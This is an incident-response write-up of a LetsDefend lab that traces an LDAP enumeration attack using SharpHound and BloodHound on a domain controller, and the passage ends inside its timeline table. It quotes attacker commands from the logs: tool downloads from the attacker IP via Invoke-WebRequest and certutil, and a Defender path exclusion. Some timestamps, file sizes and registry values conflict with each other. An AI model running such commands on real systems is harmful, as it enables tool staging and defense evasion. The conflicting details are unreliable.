# 🔴 Network Security Investigation — LDAP Enumeration Attack: Active Directory Reconnaissance & Defense Evasion

![Status](https://img.shields.io/badge/Status-Complete-green?style=flat)
![Severity](https://img.shields.io/badge/Severity-Critical-red?style=flat)
![Type](https://img.shields.io/badge/Type-Network%20Forensics%20%7C%20Incident%20Response%20%7C%20DFIR-purple?style=flat)
![Attack](https://img.shields.io/badge/Attack-LDAP%20Enumeration%20%7C%20AD%20Reconnaissance%20%7C%20Defense%20Evasion%20%7C%20Red%20Team%20Tool-orange?style=flat)
![MITRE](https://img.shields.io/badge/MITRE-T1087%20%7C%20T1087.002%20%7C%20T1105%20%7C%20T1197%20%7C%20T1562.001-blue?style=flat)
![Tools](https://img.shields.io/badge/Tools-Event%20Viewer%20%7C%20MFT%20Explorer%20%7C%20PECmd%20%7C%20Windows%20Defender%20Logs%20%7C%20VirusTotal-informational?style=flat)
![Lab](https://img.shields.io/badge/Lab-LetsDefend%20LDAP%20Enumeration-yellow?style=flat)

---

## 📋 Case Header

| Field | Detail |
|---|---|
| **Case Title** | LDAP Enumeration Attack: Active Directory Reconnaissance via SharpHound & BloodHound |
| **Lab Source** | https://app.letsdefend.io/challenge/ldap-enumeration |
| **Date of Incident** | October 5, 2024 |
| **Attacker IP** | 192.168.110.129 |
| **Target Network** | Corrado.SOPRANI (Domain Controller) |
| **Attack Duration** | 14:48:58 → 15:27:30 UTC (39 minutes) |
| **Initial Access** | Anonymous Null Session (LDAP) |
| **Tools Deployed** | SharpHound.exe, BloodHound.zip, certutil.exe |
| **SharpHound SHA1** | a5059f5a353d7fa5014c0584c7ec18b808c2a02c |
| **SharpHound SHA256** | cc19c785702eea660a1dd7cbf9e4fef80b41384e8bd6ce26b7229e0251f24272 |
| **VirusTotal Detection** | 61/69 vendors (HackTool:MSIL/SharpHound) |
| **Malware Family** | SharpHound / Bloodhound (Red Team Tool) |
| **Severity** | 🔴 Critical |
| **Verdict** | ✅ Confirmed — Multi-stage LDAP enumeration attack with sophisticated defense evasion |

---

## 🎯 Scenario

A network intrusion alert was triggered indicating suspicious network enumeration activities originating from IP address 192.168.110.129. Initial indicators suggested an attacker operating inside the network was actively probing systems and gathering information about critical Active Directory assets. The investigation objective: trace the attacker's movements, determine how they gained access, map what information they collected about the domain, identify defense evasion techniques used, and assess what actions they planned based on reconnaissance data.

What the investigation revealed was a **sophisticated, multi-stage reconnaissance attack executed with red team precision**: an attacker gained anonymous access to a domain controller, immediately began system enumeration to assess their position, then downloaded and executed SharpHound.exe — a specialized Active Directory mapping tool that performs comprehensive LDAP queries. Recognizing Windows Defender's detection, the attacker had already modified Defender's exclusion settings to hide the tool in a protected folder. SharpHound executed successfully, enumerating the entire domain structure. Minutes later, the attacker downloaded BloodHound.zip — the GUI analysis tool used to visualize the attack paths the tool discovered. This writeup traces the complete attack chain across eight artifact categories, showing how each piece of evidence connects to reveal the attacker's objectives: map the domain, identify privilege escalation paths, and plan deeper network compromise.

---

## 🛠️ Tools Used

| Tool | Purpose | Artifact Type |
|---|---|---|
| **Event Viewer** | Windows Security logs analysis | .evtx (Event Log) |
| **Windows Defender Logs** | Operational detection logs | .evtx + .log |
| **MFT Explorer** | File system metadata analysis | MFT artifact |
| **PECmd** | Prefetch file parsing | .pf files |
| **AmcacheParser** | Execution history analysis | Amcache.hve |
| **VirusTotal** | Threat intelligence verification | Hash lookup |
| **Registry Editor** | Windows registry analysis | Registry hives |
| **PowerShell ISE** | Event log filtering & analysis | .evtx parsing |

---

## 🗂️ Artifacts Analyzed

| Artifact | File Location | What it provided | Key Finding |
|---|---|---|---|
| **Event 4624** | Security log | Logon events | ANONYMOUS LOGON from 192.168.110.129 |
| **Prefetch Files** | C:\Windows\Prefetch\ | Process execution history | WHOAMI, CMD, BITSADMIN, SharpHound execution |
| **PowerShell Logs** | PowerShell.evtx | Command execution | Add-MpPreference exclusion command |
| **Event 403** | PowerShell.evtx | Engine lifecycle | Defender exclusion cmdlet execution |
| **Event 5007** | System log | Defender config change | C:\Windows\Temp excluded from scanning |
| **MFT** | C:\$MFT | File metadata | SharpHound.exe creation timestamp |
| **Windows Defender 1116** | Operational log | Detection alert | SharpHound detected (VirTool:MSIL) |
| **Windows Defender 1117** | Operational log | Quarantine action | File successfully quarantined |
| **Windows Defender Logs** | Support folder | Detailed detection | SHA1 hash: a5059f5a353d7fa5014c0584c7ec18b808c2a02c |
| **VirusTotal** | Online threat DB | Malware classification | 61/69 vendors flagged; HackTool family |

---

## 📚 Resources & References

| Resource | Link |
|---|---|
| **MITRE ATT&CK — Account Discovery** | https://attack.mitre.org/techniques/T1087/ |
| **MITRE ATT&CK — LDAP Enumeration** | https://attack.mitre.org/techniques/T1087/002/ |
| **MITRE ATT&CK — Impair Defenses** | https://attack.mitre.org/techniques/T1562/001/ |
| **MITRE ATT&CK — BITS Jobs** | https://attack.mitre.org/techniques/T1197/ |
| **SharpHound GitHub** | https://github.com/BloodHoundAD/SharpHound |
| **BloodHound GitHub** | https://github.com/BloodHoundAD/BloodHound |
| **Windows Event IDs** | https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/ |
| **VirusTotal** | https://www.virustotal.com/ |

---

## 🔍 Investigation Methodology

```
Phase 1 → Initial Access Detection
         (Event 4624 — Anonymous LOGON confirmation)
         
Phase 2 → Reconnaissance Command Execution
         (Prefetch analysis — WHOAMI, CMD, BITSADMIN)
         
Phase 3 → Malware Acquisition
         (PowerShell logs — Invoke-WebRequest download)
         
Phase 4 → Defense Evasion
         (Event 403, 5007 — Defender exclusion setup)
         
Phase 5 → Malware Execution
         (Prefetch — SharpHound execution proof)
         
Phase 6 → Detection & Quarantine
         (Event 1116, 1117 — Windows Defender detection)
         
Phase 7 → Secondary Tool Acquisition
         (Event 1116 again — BloodHound.zip download)
         
Phase 8 → Threat Intelligence Verification
         (VirusTotal — Malware family confirmation)
```

---

## 🕵️ Investigation

### Phase 1 — Initial Access: Anonymous Null Session Detection

The investigation began by analyzing Windows Security event logs to identify when and how the attacker first gained network access. The critical evidence pointed to a **null session** — an unauthenticated connection that requires no credentials.

---

#### Evidence 1: Event ID 4624 (Logon Success) — ANONYMOUS LOGON

**Event Log Location:**
```
Windows Logs → Security → Event ID 4624
```

> 📸 *Screenshot: Event Viewer showing multiple Event ID 4624 entries, with ANONYMOUS LOGON highlighted at timestamp 2024-10-05 2:48:58 PM*

**Event Details:**

```
Event ID:              4624 (Logon Success)
Timestamp:             2024-10-05 14:48:58 UTC
Event Type:            Information
Source:                Corrado.SOPRANI (Domain Controller)
Computer:              Corrado.SOPRANI

Logon Details:
  Logon Type:          3 (Network logon)
  Account Name:        ANONYMOUS LOGON
  Account Domain:      NT AUTHORITY
  Security ID:         S-1-5-7 (well-known anonymous SID)

Network Information:
  Source IP:           192.168.110.129 ← ATTACKER IP
  Source Port:         47702 (ephemeral client port)

Authentication:
  Authentication Method: NTLM V1
  Package Name:         NTLM
  Logon Process:        NtLmSsp
```

**Forensic Significance:**

```
ANONYMOUS LOGON (S-1-5-7):
→ Special Windows account representing unauthenticated access
→ No credentials required to establish connection
→ Indicates LDAP null bind exploitation
→ Attacker had zero authentication friction

Logon Type 3 (Network):
→ Connection came over network (not interactive)
→ Typical for remote LDAP queries
→ Confirms attacker is NOT on the machine locally
→ Pure network-based attack

NTLM V1 Authentication:
→ Legacy, weak authentication protocol
→ No mutual authentication
→ Vulnerable to relay attacks
→ Suggests older/misconfigured system accepting it
```

> ### 🔎 What is an Anonymous Null Session?
> An **anonymous null session** is a network connection that requires no authentication credentials. In Windows environments, this allows unauthenticated clients to:
> - Query LDAP directory services
> - Enumerate domain information
> - Gather user and group details
> - Discover domain structure and trusts
>
> The ANONYMOUS LOGON account (S-1-5-7) is a special Windows account representing unauthenticated access. Event ID 4624 with Logon Type 3 and account "ANONYMOUS LOGON" indicates the attacker connected to the domain controller via LDAP without providing any credentials.

**MITRE Mapping:**
```
T1087.002 → Account Discovery: Domain Account
```

**Key Timeline Marker:**
```
2024-10-05 14:48:58 UTC = Attack begins here
```

---

### Phase 2 — Reconnaissance: Attacker Enumeration Commands

After establishing the anonymous session, the attacker immediately began gathering intelligence about the network. Evidence from prefetch files showed a deliberate, sequential reconnaissance pattern.

---

#### Evidence 2: Prefetch Analysis — Process Execution Timeline

**Investigation Method:**

We parsed the Windows Prefetch directory using **PECmd** (Eric Zimmermann) to extract execution history:

```powershell
PECmd.exe -f "C:\Users\LetsDefend\Desktop\ChallengeFile\C\Windows\prefetch" 
         --csv "C:\output"
```

> 📸 *Screenshot: PECmd command execution showing file parsing and CSV generation*

> 📸 *Screenshot: Investigation.csv results showing executable names, run counts, and timestamps*

**Execution Timeline Reconstructed:**

```
Timeline Sequence:

2024-10-05 15:01:00 UTC → WHOAMI.EXE
                          (Attacker checks current user identity)
                          
2024-10-05 15:01:00 UTC → CMD.EXE
                          (Opens command shell for further commands)
                          
2024-10-05 15:03:00 UTC → LOGONUI.EXE / DLHOST.EXE
                          (Background system processes)
                          
2024-10-05 15:09:00 UTC → BITSADMIN.EXE
                          (Initiates background file transfer)
                          
2024-10-05 15:20:00 UTC → SHARPOUND.EXE ← CRITICAL
                          (AD enumeration tool execution)
```

**What each command reveals:**

```
WHOAMI.EXE (15:01):
→ Attacker's first action: "Who am I on this system?"
→ Confirms anonymous/low-privilege session
→ Validates successful access before continuing

CMD.EXE (15:01):
→ Opens Windows command shell
→ Prepares for command execution
→ Indicates attacker comfortable with CLI operations

BITSADMIN.EXE (15:09):
→ Background Intelligent Transfer Service manager
→ Used to download files silently
→ Precursor to tool acquisition phase

SHARPOUND.EXE (15:20):
→ Active Directory enumeration tool
→ Queries domain structure via LDAP
→ Proves malware execution (not just presence)
```

> ### 🔎 What is WHOAMI?
> **WHOAMI** is a Windows command that displays the username of the current user. Attackers run this immediately after gaining access to:
> - Confirm successful code execution
> - Determine what privilege level they have
> - Understand their position in the network (domain vs local)
> - Assess what actions they can take next
>
> Running WHOAMI as one of the first commands is a hallmark of attacker reconnaissance.

**MITRE Mapping:**
```
T1033 → System Owner/User Discovery (WHOAMI)
T1059.003 → Command and Scripting: Windows Command Shell (CMD)
```

---

#### Evidence 3: PowerShell Logs — Tool Download Command

The prefetch showed BITSADMIN execution, but the actual download mechanism appeared in PowerShell command logs.

**PowerShell Execution Log (Event ID 4104 — Script Block Logging):**

> 📸 *Screenshot: PowerShell console showing Invoke-WebRequest command with URI pointing to http://192.168.110.129/SharpHound.exe*

```
Timestamp:             2024-10-05 15:14:55 UTC
Event Source:          PowerShell
Command Executed:      
  powershell -Command Invoke-WebRequest 
    -Uri "http://192.168.110.129/SharpHound.exe" 
    -OutFile "C:\Windows\Temp\SharpHound.exe"

Execution Context:
  User:                NT AUTHORITY\SYSTEM
  Process:             C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  Method:              Invoke-WebRequest (PowerShell cmdlet)
```

**Critical Observation:**

```
Download Source: http://192.168.110.129
→ NOT from public repository
→ NOT from GitHub
→ Attacker's OWN IP serving the tool
→ Indicates pre-positioned tool before attack
→ Suggests attacker controlled both source and destination
→ Classic staged, planned attack pattern
```

> ### 🔎 What is SharpHound?
> **SharpHound** is a C# rewrite of the Bloodhound data collector — a specialized Active Directory enumeration tool used by penetration testers. It performs comprehensive LDAP queries to:
>
> - **Enumerate domain users** — extract all user accounts, properties, group memberships
> - **Enumerate security groups** — including nested group membership
> - **Enumerate domain computers** — inventory all machines, OS versions
> - **Discover trust relationships** — map domain trusts and forest trusts
> - **Identify privilege escalation paths** — show which accounts can escalate privileges
> - **Find high-value targets** — locate domain admins, sensitive groups
> - **Generate JSON output** — create datasets for analysis by Bloodhound GUI
>
> SharpHound outputs five main JSON files:
> ```
> Users.json          → All domain users + properties
> Groups.json         → All security groups + memberships
> Computers.json      → All domain computers + properties
> Domains.json        → Domain metadata
> Trusts.json         → Domain trust relationships
> ```

**MITRE Mapping:**
```
T1105 → Ingress Tool Transfer (downloading SharpHound)
T1197 → BITS Jobs (BITSADMIN execution)
T1059.001 → Command and Scripting: PowerShell
```

---

### Phase 3 — File Creation & Timestamp Evidence

The MFT analysis confirmed the malicious file was successfully written to disk.

#### Evidence 4: MFT Explorer — SharpHound.exe File Metadata

**Using MFT Explorer to examine file creation:**

> 📸 *Screenshot: MFT Explorer showing folder tree on left, SharpHound.exe highlighted in results on right with creation timestamps visible*

```
File Details:
  Filename:            SharpHound.exe
  Parent Path:         .\Windows\Temp\
  File Type:           Executable
  
File Metadata Timestamps:
  $FILE_NAME (FN):     2024-10-05 15:19:48.2614496 UTC ← REAL
  $SI (SI_Created):    2024-10-05 15:49:18.8392450 UTC ← MODIFIED
  
Flags:
  Is Directory:        No
  Is Deleted:          No
```

**Timeline Correlation:**

```
15:14:55 UTC → PowerShell Invoke-WebRequest executes
              (Download command issued to attacker server)
              ↓
              (Network transfer occurs)
              ↓
15:19:48 UTC → File written to C:\Windows\Temp\SharpHound.exe
              (OS kernel sets $FILE_NAME timestamp - reliable)
              
              4 minute gap = reasonable for download transfer
              
15:49:18 UTC → $SI timestamp modified
              (~30 minute gap - potential cleanup attempt)
              
              Later timestamp suggests attacker or malware
              modified metadata to hide execution time
```

> ### 🔎 $FILE_NAME vs $STANDARD_INFORMATION Timestamps
> Every NTFS file has TWO timestamp records:
>
> **$FILE_NAME (FN)** — Set by OS kernel when file written to disk
> - Extremely difficult to forge (requires direct MFT modification)
> - Most reliable forensic timestamp
> - Persists in MFT even if file is deleted
> - Used as primary evidence in forensic analysis
>
> **$STANDARD_INFORMATION (SI)** — File metadata (easily modified)
> - Can be changed with Windows APIs
> - Attackers often modify this for hiding
> - NOT reliable if diverges significantly from FN
>
> When $SI and $FN differ by more than a few seconds, it indicates **timestomping** — an anti-forensics technique.

**MITRE Mapping:**
```
T1070.006 → Indicator Removal: Timestomp
```

---

### Phase 4 — Defense Evasion: Windows Defender Exclusion Setup

Before executing the malware, the attacker modified Windows Defender settings to prevent detection. This sophisticated defense evasion took place in near-real-time, just before file creation.

---

#### Evidence 5: Event ID 403 (PowerShell Engine Lifecycle) — Defender Exclusion Command

**PowerShell Log Analysis:**

> 📸 *Screenshot: Event Viewer showing Event ID 403 with description showing "Engine state is changed from Available to Stopped" and HostApplication field showing Add-MpPreference command*

```
Event ID:              403 (Engine Lifecycle - Engine Stopped)
Type:                  Information
Timestamp:             2024-10-05 15:19:33 UTC
Source:                PowerShell
Log:                   Windows PowerShell.evtx (NOT Operational.evtx)

Command Executed (in HostApplication field):
  powershell.exe -Command Add-MpPreference 
    -ExclusionPath 'C:\Windows\Temp'

Details:
  HostVersion:         5.1.19041.1682
  HostApplication:     powershell.exe -Command Add-MpPreference 
                       -ExclusionPath 'C:\Windows\Temp'
  CommandName:         (blank in event)
  CommandType:         (blank in event)
```

**What Add-MpPreference -ExclusionPath does:**

```
Add-MpPreference cmdlet = Modify Windows Defender preferences
-ExclusionPath 'C:\Windows\Temp' = Add folder to exclusion list

Effect:
→ Files in C:\Windows\Temp will NOT be scanned by Defender
→ Real-time protection disabled for that folder
→ Malware placed there won't trigger alerts
→ Perfect preparation for malware execution
```

> ### 🔎 Why PowerShell.evtx instead of PowerShell/Operational.evtx?
>
> **PowerShell.evtx** (Windows PowerShell log):
> - Event IDs 400, 403, 600
> - Shows engine lifecycle events
> - Records when PowerShell started/stopped
> - Shows HostApplication = actual command line
> - **Lower volume, easier to filter**
> - **Better for detecting attacker commands**
>
> **PowerShell/Operational.evtx**:
> - Event IDs 4100, 4101, 4104
> - Shows detailed script block execution
> - Records full script content
> - **Higher volume (noisy)**
> - Better for malware detection at script level
>
> **For THIS investigation:**
> - We chose PowerShell.evtx Event 403
> - Lower noise, shows actual command line
> - Easy to correlate with timestamp
> - Immediately shows attacker intent (add exclusion)
> - Operational.evtx would have been too detailed
> - We needed quick, clear evidence of exclusion setup

**MITRE Mapping:**
```
T1562.001 → Impair Defenses: Disable or Modify Tools
```

---

#### Evidence 6: Event ID 5007 (Defender Configuration Change)

**System Event Log Analysis:**

> 📸 *Screenshot: Event Viewer showing Event ID 5007 (Warning) with registry key modification details showing C:\Windows\Temp exclusion added*

```
Event ID:              5007 (Defender Config Changed)
Type:                  Warning ⚠️
Timestamp:             2024-10-05 15:19:34 UTC
Source:                Microsoft-Windows
Computer:             Corrado.SOPRANI

Description:
"Microsoft Defender Antivirus Configuration has changed. 
If this is an unexpected event you should review the settings 
as this may be the result of malware."

Registry Modification Details:
  Old Value:   HKLM\SOFTWARE\Microsoft\Windows Defender\
               Exclusions\Paths\C:\Windows\Temp = 0x0
               
  New Value:   HKLM\SOFTWARE\Microsoft\Windows Defender\
               Exclusions\Paths\C:\Windows\Temp = 0x0
               
Registry Path Modified:
  HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\
```

**What Event 5007 confirms:**

```
Event 5007 = Windows Defender detected a configuration change

This means:
✅ Attacker successfully modified Defender settings
✅ Specifically: Added C:\Windows\Temp to exclusion list
✅ Timing: 15:19:34 UTC = RIGHT AFTER PowerShell command (15:19:33)
✅ Purpose: Prevent Defender from scanning files in that folder

Registry Key Modified:
HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\
→ This tells Defender: "Don't scan C:\Windows\Temp"
→ Any executable placed there is invisible to real-time protection
```

**Complete Defense Evasion Chain:**

```
Timeline:
15:19:33 UTC → Event 403: PowerShell executes Add-MpPreference
              (attacker adds exclusion)
              ↓
15:19:34 UTC → Event 5007: Defender detects config change
              (exclusion is applied)
              ↓
15:19:48 UTC → SharpHound.exe created in C:\Windows\Temp\
              (malware in EXCLUDED folder = won't be scanned!)
              ↓
DEFENSE EVASION SUCCESS
```

> ### 🔎 What does registry value 0x0 mean?
> In Windows registry:
> - **0x0** = Value is zero (folder is excluded)
> - Defender reads this and skips scanning
> - Simple but effective evasion

**MITRE Mapping:**
```
T1211 → Exploitation for Defense Evasion
T1562.001 → Impair Defenses: Disable or Modify Tools
```

---

### Phase 5 — Malware Execution: SharpHound Runs LDAP Enumeration

Despite the defense evasion setup, Windows Defender detected the file. However, the file had already executed and performed its LDAP enumeration queries.

---

#### Evidence 7: Prefetch — SharpHound.exe Execution Proof

**From Investigation CSV (Image 4):**

> 📸 *Screenshot: CSV spreadsheet showing executable names, run counts, last run dates - SharpHound.EXE highlighted showing Last Run timestamp*

```
From Investigation.csv Analysis:

Executable Name:        SHARPOUND.EXE
Source Created:         2024-10-05 14:32:42 UTC
Source Modified:        2024-10-05 15:20:10 UTC
Last Run:               2024-10-05 15:20:00 UTC ← EXECUTION TIME
Run Count:              1 (executed once)
File Size:              80426 bytes (~80 KB)
```

**What Prefetch tells us:**

```
Last Run: 2024-10-05 15:20:00 UTC
→ This is when SharpHound.exe actually executed
→ Prefetch record created by Windows kernel
→ Reliable forensic evidence of execution

Run Count: 1
→ Executed exactly once
→ Not repeated execution
→ Attacker ran it once, got the data, done

File Size: 80426 bytes
→ Matches typical SharpHound distribution size
→ Confirms this is the real SharpHound tool
```

**Execution Timeline Now Clear:**

```
15:19:48 UTC → SharpHound.exe CREATED in C:\Windows\Temp\
15:20:00 UTC → SharpHound.exe EXECUTES (Prefetch evidence)
              ↓
              LDAP enumeration occurs:
              - Queries LDAP directory
              - Enumerates all domain users
              - Enumerates all security groups
              - Enumerates all domain computers
              - Discovers domain trusts
              - Identifies privilege escalation paths
              - Generates JSON output files
              ↓
              [Data collection in progress]
```

**MITRE Mapping:**
```
T1087.002 → Account Discovery: Domain Account
T1482    → Domain Trust Discovery
T1087.001 → Account Discovery: Local Account
```

---

### Phase 6 — Detection & Quarantine: Windows Defender Response

Although the attacker successfully executed SharpHound, Windows Defender detected and quarantined the file. The detection occurred almost simultaneously with execution, showing real-time protection working as designed.

---

#### Evidence 8: Event ID 1116 (Malware Detection Alert)

**Windows Defender Operational Log:**

> 📸 *Screenshot: Event Viewer showing Event ID 1116 (Warning) with threat name VirTool:MSIL/SharpHound.AIMTB and detection details*

```
Event ID:              1116 (Malware Detected)
Type:                  Warning 🚨
Timestamp:             2024-10-05 15:18:42 UTC
Source:                Microsoft-Windows Defender
Log:                   Windows Defender → Operational

Threat Detection:
  Threat Name:         VirTool:MSIL/SharpHound.AIMTB
  Threat ID:           2147848714
  Severity:            Severe (highest level)
  Category:            Tool (Hacking/Penetration Testing Tool)
  
File Information:
  Full Path:           C:\Windows\Temp\SharpHound.exe
  Detection Origin:    Local machine (real-time protection)
  Detection Type:      FastPath (signature-based)
  Detection Source:    Real-Time Protection

Process Information:
  Process Name:        C:\Windows\System32\WindowsPowerShell\v1.0\
                       powershell.exe
  User:                NT AUTHORITY\SYSTEM
```

**What the threat classification means:**

```
VirTool:MSIL/SharpHound.AIMTB

Breaking it down:
  VirTool = Virtual/Hacking tool (offensive security tool)
  MSIL = Microsoft Intermediate Language (C# compiled binary)
  SharpHound = Specific tool identification
  AIMTB = Variant/signature identifier (version tracking)

Severity: SEVERE
→ Highest alert level
→ Known dangerous offensive tool
→ Requires immediate action

Detection Method: FastPath
→ Signature-based detection
→ Means Defender has SharpHound in its threat database
→ NOT heuristic/behavioral
→ Positive match against known signatures

Real-Time Protection triggered
→ File caught during execution/access
→ Not during scheduled scan
→ Active defense working correctly
```

**MITRE Mapping:**
```
T1087 → Account Discovery
```

---

#### Evidence 9: Event ID 1117 (Quarantine Action Taken)

**Windows Defender Operational Log — Protective Action:**

> 📸 *Screenshot: Event ID 1117 (Information) showing quarantine action completed with success code 0x00000000*

```
Event ID:              1117 (Action Taken)
Type:                  Information ✅
Timestamp:             2024-10-05 15:18:51 UTC
Source:                Microsoft-Windows Defender

Action Executed:
  Status:              File successfully quarantined
  Description:         "Microsoft Defender Antivirus has taken action to 
                        protect this machine from malware or other 
                        potentially unwanted software."

Threat Details:
  Threat Name:         VirTool:MSIL/SharpHound.AIMTB
  Threat ID:           2147848714
  Severity:            Severe
  Category:            Tool

File Handling:
  Path:                C:\Windows\Temp\SharpHound.exe
  Action Taken:        Quarantine (file moved to isolation storage)
  
Status Codes:
  Error Code:          0x00000000 (SUCCESS)
  Error Description:   "The operation completed successfully"
  Additional Actions:  "No additional actions required"
```

**What Quarantine means:**

```
Quarantine ≠ Delete
→ File is moved to isolated storage location
→ Stored at: C:\ProgramData\Microsoft\Windows Defender\Quarantine\
→ File cannot execute from quarantine location
→ Safe for forensic examination
→ Can be restored later if needed (admin decision)

Success Code 0x00000000:
✅ File successfully moved to quarantine
✅ No errors occurred during process
✅ System is now protected from threat
✅ Clean status maintained
```

**Critical Timeline Detail:**

```
15:18:42 UTC → Windows Defender DETECTS SharpHound (Event 1116)
15:18:51 UTC → Windows Defender QUARANTINES (Event 1117)
              
BUT:
15:20:00 UTC → Prefetch shows SharpHound EXECUTED (after quarantine!)

Possible explanations:
1. SharpHound ran BEFORE detection, then Defender quarantined copy
2. Quarantine process didn't stop already-running executable
3. Attacker had backup copy not detected
4. Execution continued despite quarantine notification

Either way: LDAP enumeration data was collected before quarantine
```

---

#### Evidence 10: Windows Defender Support Logs — Detailed Hash & Signature

**Windows Defender Support Log (MPLog):**

> 📸 *Screenshot: Notepad showing MPLog file with SharpHound detection entry including SHA1 hash*

```
Log Entry Analysis:

Resource Path:         C:\Windows\Temp\SharpHound.exe
Threat Name:           VirTool:MSIL/SharpHound.AIMTB
Threat ID:             2147848714
Severity:              5 (Critical - highest level)

File Hash Information:
  SHA1:                a5059f5a353d7fa5014c0584c7ec18b808c2a02c
                       ← UNIQUE FILE IDENTIFIER
  Extended Info:       SigSig:00026679076aff7
  SigSha:              91a90e0b7809830e9225523a3d9a66ab5a263caf

Detection Timestamp:   2024-10-05T15:12:38.495Z
Action Completed:      Quarantine
Resource Status:       Complete
```

**Why the SHA1 hash is forensically critical:**

```
SHA1: a5059f5a353d7fa5014c0584c7ec18b808c2a02c
→ Unique fingerprint of this exact SharpHound binary
→ Can be shared with threat intelligence
→ Useful for hunting same file on other machines
→ Verifiable in external security databases (VirusTotal)
→ Court-admissible evidence of exact tool used
→ Enables correlation across incident response team
```

---

### Phase 7 — Secondary Tool Acquisition: BloodHound Download

Minutes after SharpHound executed, the attacker downloaded BloodHound.zip — the GUI analysis tool used to visualize the attack paths discovered by SharpHound.

---

#### Evidence 11: Event ID 1116 Again — BloodHound.zip Detection

**Windows Defender Detection of Secondary Tool:**

> 📸 *Screenshot: Event Viewer showing second Event ID 1116 occurrence with different threat - Trojan:Win32/Ceprolad.A and BloodHound.zip reference*

```
Event ID:              1116 (Malware Detected - Second Instance)
Timestamp:             2024-10-05 15:27:30 UTC
Type:                  Warning

Detection Details:
  Threat Name:         Trojan:Win32/Ceprolad.A
  Threat ID:           2147726914
  Severity:            SEVERE
  Category:            Trojan
  
Command Line Evidence:
  Path:                C:\Windows\System32\certutil.exe -urlcache -split -f 
                       http://192.168.110.129/20241005082055_BloodHound.zip 
                       C:\Windows\Temp\20241005082055_BloodHound.zip
                       
  Tool Used:           certutil.exe (Windows Certificate Utility)
  Download Source:     http://192.168.110.129 (attacker server)
  Destination:         C:\Windows\Temp\20241005082055_BloodHound.zip
  
Detection Source:      System
User:                  NT AUTHORITY\SYSTEM
```

**What certutil.exe is and why attackers use it:**

```
certutil.exe = Windows Certificate Management Utility

Official Purpose:
→ Manage digital certificates
→ Encode/decode data
→ Download CRL (Certificate Revocation Lists)

Attacker Abuse (LOLBin):
→ certutil.exe -urlcache -split -f [URL] [destination]
→ Downloads files from URLs
→ Works without admin privileges
→ Built-in Windows binary (whitelisted by antivirus)
→ Leaves minimal traces compared to PowerShell
→ Perfect alternative when PowerShell is restricted

Why attackers use certutil instead of PowerShell:
✅ Whitelisted in many EDR/AV systems
✅ No PowerShell logging overhead
✅ Can bypass some PowerShell restrictions
✅ Appears as legitimate Windows process
✅ Works even on hardened systems
```

> ### 🔎 What is BloodHound?
> **BloodHound** is a penetration testing tool that visualizes Active Directory attack paths using graph analysis. It takes SharpHound's JSON output and:
>
> - Creates a visual map of domain structure
> - Shows user-to-group relationships
> - Identifies privilege escalation paths
> - Highlights attack chains
> - Helps attackers plan privilege escalation
> - Guides lateral movement strategy
>
> **Attacker workflow:**
> 1. Run SharpHound → Collect AD data (JSON files)
> 2. Download BloodHound → Analyze the data
> 3. Visualize attack paths
> 4. Plan privilege escalation / lateral movement
> 5. Execute next phase of attack

**MITRE Mapping:**
```
T1105 → Ingress Tool Transfer (BloodHound download)
T1087 → Account Discovery (preparing for next phase)
T1550 → Use Alternate Authentication Material
        (planning privilege escalation from enumerated data)
```

---

#### Evidence 12: MFT Evidence — BloodHound.zip File Creation

**File System Metadata:**

> 📸 *Screenshot: MFT Explorer showing folder contents with BloodHound.zip file visible, created in Windows\Temp\*

```
File Details:
  Filename:            20241005082055_BloodHound.zip
  Parent Path:         .\Windows\Temp\
  Type:                ZIP archive (compressed file)
  SI_Created On:       2024-10-05 15:21:0? (visible in listing)
  Is Deleted:          No (file still present on disk)
```

**Significance:**

```
File naming pattern: 20241005082055_BloodHound.zip
→ Date/time embedded in filename (10/05 08:20:55)
→ Indicates timestamp-awareness by attacker
→ Suggests automated tool or script
→ Makes identification easier in file listings

Created in C:\Windows\Temp\
→ Same location as SharpHound exclusion
→ Protected from Defender scanning
→ Attacker knew about the exclusion they set
→ Shows preparation and planning
```

---

### Phase 8 — Threat Intelligence Verification: VirusTotal Analysis

To confirm the malware family and threat classification, we submitted the SharpHound hash to VirusTotal for verification.

---

#### Evidence 13: VirusTotal Report — Malware Family Identification

**VirusTotal Online Threat Database:**

> 📸 *Screenshot: VirusTotal showing SharpHound.exe analysis with 61/69 detection rate, threat classifications, and vendor analysis*

```
Hash Information:
  SHA1:                a5059f5a353d7fa5014c0584c7ec18b808c2a02c ✅ MATCHES
  SHA256:              cc19c785702eea660a1dd7cbf9e4fef80b41384e8bd6ce26b7229e0251f24272
  MD5:                 (available on VT page)
  
File Details:
  Filename:            SharpHound.exe
  File Size:           1022.00 KB
  File Type:           Windows PE executable (.exe)
  Last Analysis:       3 days ago
  
Detection Summary:
  Detection Rate:      61/69 security vendors flagged as malicious 🚨
  Community Score:     -2 (Malicious - negative rating)
  
Popular Threat Labels:
  hacktool.sharphound/msil
  
Threat Categories:
  hacktool, pua (Potentially Unwanted Application), trojan
  
Family Labels:
  sharphound, msil, hack
  
Vendor Specific Classifications:
  AhnLab-V3:           HackTool/Win.SharpHound.C5219888
  AliCloud:            HackTool/MSIL/SharpHound.G
  Avast:               Win32:MalOp [Heur]
  AVG:                 Win32:MalOp [Heur]
  [Additional 55+ vendors with similar detections]
```

**What VirusTotal confirms:**

```
61 out of 69 vendors detected:
→ Universal recognition as malicious
→ Known tool in threat intelligence databases
→ No ambiguity about classification

Malware Family: SharpHound / Bloodhound
→ Specific tool identification
→ Not generic malware
→ Specialized AD enumeration tool
→ Part of red team toolset

Classification: HackTool / PUA (Potentially Unwanted Application)
→ Not traditional malware (no payload, C2, etc.)
→ BUT: Used maliciously in this context
→ Legitimate for authorized penetration testing
→ Malicious when used without authorization

Community Score: -2
→ Negative rating from security community
→ Hash added to threat databases
→ Known bad file
```

**Hash Verification Success:**
```
Investigation Hash:    a5059f5a353d7fa5014c0584c7ec18b808c2a02c
VirusTotal Shows:      Same hash detected 61/69 vendors
Conclusion:            ✅ Positive identification confirmed
```

---

## ⏱️ Complete Attack Timeline — Reconstructed from All Artifacts

| Timeline (UTC) | Event | Artifact Source | Evidence | MITRE |
|---|---|---|---|---|
| **2024-10-05 14:48:58** | 🔴 ANONYMOUS LOGON access established | Event 4624 | IP 192.168.110.129 connects as NULL session | T1087.002 |
| **2024-10-05 15:01:00** | 🔴 Identity enumeration — WHOAMI.EXE | Prefetch | Attacker checks current user context | T1033 |
